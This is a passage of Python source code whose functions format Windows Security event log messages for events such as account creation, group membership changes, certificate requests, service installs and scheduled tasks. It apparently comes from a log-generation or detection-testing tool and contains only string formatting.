        "A handle to an object was requested.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Object:\r\n"
        f"\tObject Server:\t\tSecurity\r\n"
        f"\tObject Type:\t\t{d.get('ObjectType','')}\r\n"
        f"\tObject Name:\t\t{d.get('ObjectName','')}\r\n"
        f"\tHandle ID:\t\t{d.get('HandleId','')}\r\n"
        f"\tResource Attributes:\t{d.get('ResourceAttributes','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tProcess ID:\t\t{d.get('ProcessId','')}\r\n"
        f"\tProcess Name:\t\t{d.get('ProcessName','')}\r\n\r\n"
        "Access Request Information:\r\n"
        f"\tTransaction ID:\t\t{d.get('TransactionId','')}\r\n"
        f"\tAccesses:\t\t{d.get('AccessList','')}\r\n"
        f"\tAccess Mask:\t\t{d.get('AccessMask','')}\r\n"
        f"\tPrivileges Used for Access Check:\t{d.get('PrivilegeList','')}\r\n"
        f"\tRestricted SID Count:\t{d.get('RestrictedSidCount','0')}"
    )


def _msg_4663(d):
    return (
        "An attempt was made to access an object.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Object:\r\n"
        f"\tObject Server:\t\tSecurity\r\n"
        f"\tObject Type:\t\t{d.get('ObjectType','')}\r\n"
        f"\tObject Name:\t\t{d.get('ObjectName','')}\r\n"
        f"\tHandle ID:\t\t{d.get('HandleId','')}\r\n"
        f"\tResource Attributes:\t{d.get('ResourceAttributes','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tProcess ID:\t\t{d.get('ProcessId','')}\r\n"
        f"\tProcess Name:\t\t{d.get('ProcessName','')}\r\n\r\n"
        "Access Request Information:\r\n"
        f"\tAccesses:\t\t{d.get('AccessList','')}\r\n"
        f"\tAccess Mask:\t\t{d.get('AccessMask','')}"
    )


def _msg_4741(d):
    uac_flags = d.get('UserAccountControl', '%%2080')
    return (
        "A computer account was created.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "New Computer Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Attributes:\r\n"
        f"\tSAM Account Name:\t{d.get('SamAccountName','')}\r\n"
        f"\tDisplay Name:\t\t{d.get('DisplayName','-')}\r\n"
        f"\tUser Principal Name:\t{d.get('UserPrincipalName','-')}\r\n"
        f"\tHome Directory:\t\t{d.get('HomeDirectory','-')}\r\n"
        f"\tHome Drive:\t\t{d.get('HomePath','-')}\r\n"
        f"\tScript Path:\t\t{d.get('ScriptPath','-')}\r\n"
        f"\tProfile Path:\t\t{d.get('ProfilePath','-')}\r\n"
        f"\tUser Workstations:\t{d.get('UserWorkstations','-')}\r\n"
        f"\tPassword Last Set:\t{d.get('PasswordLastSet','')}\r\n"
        f"\tAccount Expires:\t\t{d.get('AccountExpires','%%1794')}\r\n"
        f"\tPrimary Group ID:\t{d.get('PrimaryGroupId','515')}\r\n"
        f"\tAllowedToDelegateTo:\t{d.get('AllowedToDelegateTo','-')}\r\n"
        f"\tOld UAC Value:\t\t{d.get('OldUacValue','0x0')}\r\n"
        f"\tNew UAC Value:\t\t{d.get('NewUacValue','')}\r\n"
        f"\tUser Account Control:\t{uac_flags}\r\n"
        f"\tUser Parameters:\t{d.get('UserParameters','-')}\r\n"
        f"\tSID History:\t\t{d.get('SidHistory','-')}\r\n"
        f"\tLogon Hours:\t\t{d.get('LogonHours','%%1793')}\r\n"
        f"\tDNS Host Name:\t\t{d.get('DnsHostName','')}\r\n"
        f"\tService Principal Names:\t{d.get('ServicePrincipalNames','-')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4742(d):
    return (
        "A computer account was changed.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Computer Account That Was Changed:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Changed Attributes:\r\n"
        f"\tSAM Account Name:\t{d.get('SamAccountName','')}\r\n"
        f"\tDisplay Name:\t\t{d.get('DisplayName','-')}\r\n"
        f"\tUser Principal Name:\t{d.get('UserPrincipalName','-')}\r\n"
        f"\tHome Directory:\t\t{d.get('HomeDirectory','-')}\r\n"
        f"\tHome Drive:\t\t{d.get('HomePath','-')}\r\n"
        f"\tScript Path:\t\t{d.get('ScriptPath','-')}\r\n"
        f"\tProfile Path:\t\t{d.get('ProfilePath','-')}\r\n"
        f"\tUser Workstations:\t{d.get('UserWorkstations','-')}\r\n"
        f"\tPassword Last Set:\t{d.get('PasswordLastSet','-')}\r\n"
        f"\tAccount Expires:\t\t{d.get('AccountExpires','-')}\r\n"
        f"\tPrimary Group ID:\t{d.get('PrimaryGroupId','-')}\r\n"
        f"\tAllowedToDelegateTo:\t{d.get('AllowedToDelegateTo','-')}\r\n"
        f"\tOld UAC Value:\t\t{d.get('OldUacValue','')}\r\n"
        f"\tNew UAC Value:\t\t{d.get('NewUacValue','')}\r\n"
        f"\tUser Account Control:\t{d.get('UserAccountControl','-')}\r\n"
        f"\tUser Parameters:\t{d.get('UserParameters','-')}\r\n"
        f"\tSID History:\t\t{d.get('SidHistory','-')}\r\n"
        f"\tLogon Hours:\t\t{d.get('LogonHours','-')}\r\n"
        f"\tDNS Host Name:\t\t{d.get('DnsHostName','')}\r\n"
        f"\tService Principal Names:\t{d.get('ServicePrincipalNames','-')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4781(d):
    return (
        "The name of an account was changed.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Account That Was Changed:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tOld Account Name:\t{d.get('OldTargetUserName','')}\r\n"
        f"\tNew Account Name:\t{d.get('NewTargetUserName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_5136(d):
    return (
        "A directory service object was modified.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Directory Service:\r\n"
        f"\tName:\t\t{d.get('DSName','')}\r\n"
        f"\tType:\t\t{d.get('DSType','%%14676')}\r\n\r\n"
        "Object:\r\n"
        f"\tDN:\t\t{d.get('ObjectDN','')}\r\n"
        f"\tGUID:\t\t{d.get('ObjectGUID','')}\r\n"
        f"\tClass:\t\t{d.get('ObjectClass','')}\r\n\r\n"
        "Attribute:\r\n"
        f"\tLDAP Display Name:\t{d.get('AttributeLDAPDisplayName','')}\r\n"
        f"\tSyntax (OID):\t\t{d.get('AttributeSyntaxOID','')}\r\n"
        f"\tValue:\t\t{d.get('AttributeValue','')}\r\n\r\n"
        "Operation:\r\n"
        f"\tType:\t\t{d.get('OperationType','')}\r\n"
        f"\tCorrelation ID:\t\t{d.get('OpCorrelationID','')}\r\n"
        f"\tApplication Correlation ID:\t{d.get('AppCorrelationID','-')}"
    )


def _msg_5137(d):
    return (
        "A directory service object was created.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Directory Service:\r\n"
        f"\tName:\t\t{d.get('DSName','')}\r\n"
        f"\tType:\t\t{d.get('DSType','%%14676')}\r\n\r\n"
        "Object:\r\n"
        f"\tDN:\t\t{d.get('ObjectDN','')}\r\n"
        f"\tGUID:\t\t{d.get('ObjectGUID','')}\r\n"
        f"\tClass:\t\t{d.get('ObjectClass','')}\r\n\r\n"
        "Operation:\r\n"
        f"\tCorrelation ID:\t\t{d.get('OpCorrelationID','')}\r\n"
        f"\tApplication Correlation ID:\t{d.get('AppCorrelationID','-')}"
    )


def _msg_4728(d):
    return (
        "A member was added to a security-enabled global group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4732(d):
    return (
        "A member was added to a security-enabled local group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4756(d):
    return (
        "A member was added to a security-enabled universal group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4729(d):
    return (
        "A member was removed from a security-enabled global group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4733(d):
    return (
        "A member was removed from a security-enabled local group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4757(d):
    return (
        "A member was removed from a security-enabled universal group.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Member:\r\n"
        f"\tSecurity ID:\t\t{d.get('MemberSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('MemberName','')}\r\n\r\n"
        "Group:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tGroup Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tGroup Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','-')}"
    )


def _msg_4886(d):
    return (
        "Certificate Services received a certificate request.\r\n\r\n"
        f"Request ID:\t{d.get('RequestId','')}\r\n"
        f"Requester:\t{d.get('Requester','')}\r\n"
        f"Attributes:\t{d.get('Attributes','')}"
    )


def _msg_4898(d):
    # Shape per the published 4898 description: "%1 v%2 (Schema V%3)" then the template
    # DN, Template Content and Security Descriptor.
    return (
        "Certificate Services loaded a template.\r\n\r\n"
        f"Version:\t{d.get('TemplateInternalName','')} "
        f"v{d.get('TemplateVersion','')} "
        f"(Schema V{d.get('TemplateSchemaVersion','')})\r\n"
        f"Template Information:\r\n"
        f"\tTemplate Content:\t{d.get('TemplateContent','')}\r\n"
        f"\tSecurity Descriptor:\t{d.get('SecurityDescriptor','')}\r\n"
        f"\tOID:\t{d.get('TemplateOID','')}\r\n"
        f"\tTemplate DS Object FQDN:\t{d.get('TemplateDSObjectFQDN','')}"
    )


def _msg_4887(d):
    return (
        "Certificate Services approved a certificate request and issued a certificate.\r\n\r\n"
        f"Request ID:\t{d.get('RequestId','')}\r\n"
        f"Requester:\t{d.get('Requester','')}\r\n"
        f"Attributes:\t{d.get('Attributes','')}\r\n"
        f"Disposition:\t{d.get('Disposition','')}\r\n"
        f"SKI:\t\t{d.get('SubjectKeyIdentifier','')}\r\n"
        f"Subject:\t{d.get('Subject','')}"
    )


def _msg_4888(d):
    return (
        "Certificate Services denied a certificate request.\r\n\r\n"
        f"Request ID:\t{d.get('RequestId','')}\r\n"
        f"Requester:\t{d.get('Requester','')}\r\n"
        f"Attributes:\t{d.get('Attributes','')}\r\n"
        f"Disposition:\t{d.get('Disposition','')}\r\n"
        f"SKI:\t\t{d.get('SubjectKeyIdentifier','')}\r\n"
        f"Subject:\t{d.get('Subject','')}"
    )


def _msg_1102(d):
    return (
        "The audit log was cleared.\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t{d.get('SubjectUserName','')}\r\n"
        f"\tDomain Name:\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t{d.get('SubjectLogonId','')}"
    )


def _msg_4697(d):
    return (
        "A service was installed in the system.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Service Information:\r\n"
        f"\tService Name:\t\t{d.get('ServiceName','')}\r\n"
        f"\tService File Name:\t{d.get('ServiceFileName','')}\r\n"
        f"\tService Type:\t\t{d.get('ServiceType','')}\r\n"
        f"\tService Start Type:\t{d.get('ServiceStartType','')}\r\n"
        f"\tService Account:\t{d.get('ServiceAccount','')}"
    )


def _msg_4698(d):
    return (
        "A scheduled task was created.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Task Information:\r\n"
        f"\tTask Name: \t\t{d.get('TaskName','')}\r\n"
        f"\tTask Content: \t\t{d.get('TaskContent','')}\r\n\r\n"
        "Other Information:\r\n"
        f"\tProcessCreationTime: \t\t{d.get('ClientProcessStartKey','')}\r\n"
        f"\tClientProcessId: \t\t\t{d.get('ClientProcessId','')}\r\n"
        f"\tParentProcessId: \t\t\t{d.get('ParentProcessId','')}\r\n"
        f"\tFQDN: \t\t{d.get('FQDN','')}"
    )


def _msg_4699(d):
    return (
        "A scheduled task was deleted.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Task Information:\r\n"
        f"\tTask Name: \t\t{d.get('TaskName','')}\r\n"
        f"\tTask Content: \t\t{d.get('TaskContent','')}"
    )


def _msg_5140(d):
    return (
        "A network share object was accessed.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Network Information:\t\r\n"
        f"\tObject Type:\t\t{d.get('ObjectType','')}\r\n"
        f"\tSource Address:\t\t{d.get('IpAddress','')}\r\n"
        f"\tSource Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Share Information:\r\n"
        f"\tShare Name:\t\t{d.get('ShareName','')}\r\n"
        f"\tShare Path:\t\t{d.get('ShareLocalPath','')}\r\n\r\n"
        "Access Request Information:\r\n"
        f"\tAccess Mask:\t\t{d.get('AccessMask','')}\r\n"
        f"\tAccesses:\t\t{d.get('AccessList','')}"
    )


def _msg_5145(d):
    return (
        "A network share object was checked to see whether client can be granted "
        "desired access.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Network Information:\t\r\n"
        f"\tObject Type:\t\t{d.get('ObjectType','')}\r\n"
        f"\tSource Address:\t\t{d.get('IpAddress','')}\r\n"
        f"\tSource Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Share Information:\r\n"
        f"\tShare Name:\t\t{d.get('ShareName','')}\r\n"
        f"\tShare Path:\t\t{d.get('ShareLocalPath','')}\r\n"
        f"\tRelative Target Name:\t{d.get('RelativeTargetName','')}\r\n\r\n"
        "Access Request Information:\r\n"
        f"\tAccess Mask:\t\t{d.get('AccessMask','')}\r\n"
        f"\tAccesses:\t\t{d.get('AccessList','')}\r\n"
        f"\tAccess Check Results:\r\n\t\t\t\t{d.get('AccessReason','')}"
    )


def _msg_7045(d):
    return (
        "A service was installed in the system.\r\n\r\n"
        f"Service Name:  {d.get('ServiceName','')}\r\n"
        f"Service File Name:  {d.get('ImagePath','')}\r\n"
        f"Service Type:  {d.get('ServiceType','')}\r\n"
        f"Service Start Type:  {d.get('StartType','')}\r\n"
        f"Service Account:  {d.get('AccountName','')}"
    )


def _msg_4720(d):
    return (
        "A user account was created.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "New Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Attributes:\r\n"
        f"\tSAM Account Name:\t{d.get('SamAccountName','')}\r\n"
        f"\tDisplay Name:\t\t{d.get('DisplayName','')}\r\n"
        f"\tUser Principal Name:\t{d.get('UserPrincipalName','')}\r\n"
        f"\tHome Directory:\t\t{d.get('HomeDirectory','')}\r\n"
        f"\tHome Drive:\t\t{d.get('HomePath','')}\r\n"
        f"\tScript Path:\t\t{d.get('ScriptPath','')}\r\n"
        f"\tProfile Path:\t\t{d.get('ProfilePath','')}\r\n"
        f"\tUser Workstations:\t{d.get('UserWorkstations','')}\r\n"
        f"\tPassword Last Set:\t{d.get('PasswordLastSet','')}\r\n"
        f"\tAccount Expires:\t\t{d.get('AccountExpires','')}\r\n"
        f"\tPrimary Group ID:\t{d.get('PrimaryGroupId','')}\r\n"
        f"\tAllowed To Delegate To:\t{d.get('AllowedToDelegateTo','')}\r\n"
        f"\tOld UAC Value:\t\t{d.get('OldUacValue','')}\r\n"
        f"\tNew UAC Value:\t\t{d.get('NewUacValue','')}\r\n"
        f"\tUser Account Control:\t{d.get('UserAccountControl','')}\r\n"
        f"\tUser Parameters:\t{d.get('UserParameters','')}\r\n"
        f"\tSID History:\t\t{d.get('SidHistory','')}\r\n"
        f"\tLogon Hours:\t\t{d.get('LogonHours','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tPrivileges:\t\t{d.get('PrivilegeList','')}"
    )


def _msg_4722(d):
    return (
        "A user account was enabled.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}"
    )


def _msg_4724(d):
    return (
        "An attempt was made to reset an account's password.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}"
    )


def _msg_4725(d):
    return (
        "A user account was disabled.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}"
    )


def _msg_4726(d):
    return (
        "A user account was deleted.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}"
    )


def _msg_4738(d):
    return (
        "A user account was changed.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Changed Attributes:\r\n"
        f"\tSAM Account Name:\t{d.get('SamAccountName','')}\r\n"
        f"\tDisplay Name:\t\t{d.get('DisplayName','')}\r\n"
        f"\tUser Principal Name:\t{d.get('UserPrincipalName','')}\r\n"
        f"\tHome Directory:\t\t{d.get('HomeDirectory','')}\r\n"
        f"\tHome Drive:\t\t{d.get('HomePath','')}\r\n"
        f"\tScript Path:\t\t{d.get('ScriptPath','')}\r\n"
        f"\tProfile Path:\t\t{d.get('ProfilePath','')}\r\n"
        f"\tUser Workstations:\t{d.get('UserWorkstations','')}\r\n"
        f"\tPassword Last Set:\t{d.get('PasswordLastSet','')}\r\n"
        f"\tAccount Expires:\t\t{d.get('AccountExpires','')}\r\n"
        f"\tPrimary Group ID:\t{d.get('PrimaryGroupId','')}\r\n"
        f"\tAllowed To Delegate To:\t{d.get('AllowedToDelegateTo','')}\r\n"
        f"\tOld UAC Value:\t\t{d.get('OldUacValue','')}\r\n"
        f"\tNew UAC Value:\t\t{d.get('NewUacValue','')}\r\n"
        f"\tUser Account Control:\r\n"
        f"\t\t{d.get('UserAccountControl','')}\r\n"
        f"\tUser Parameters:\t{d.get('UserParameters','')}\r\n"
        f"\tSID History:\t\t{d.get('SidHistory','')}\r\n"
        f"\tLogon Hours:\t\t{d.get('LogonHours','')}"
    )


def _msg_4706(d):
    return (
        "A new trust was created to a domain.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        f"\tDomain Name:\t\t{d.get('DomainName','')}\r\n"
        f"\tDomain ID:\t\t{d.get('DomainSid','')}\r\n"
        f"\tTrust Type:\t\t{d.get('TdoType','')}\r\n"
        f"\tTrust Direction:\t{d.get('TdoDirection','')}\r\n"
        f"\tTrust Attributes:\t{d.get('TdoAttributes','')}\r\n"
        f"\tSID Filtering:\t\t{d.get('SidFilteringEnabled','')}"
    )


def _msg_4716(d):
    return (
        "Trusted domain information was modified.\r\n\r\n"
        "Subject:\r\n"
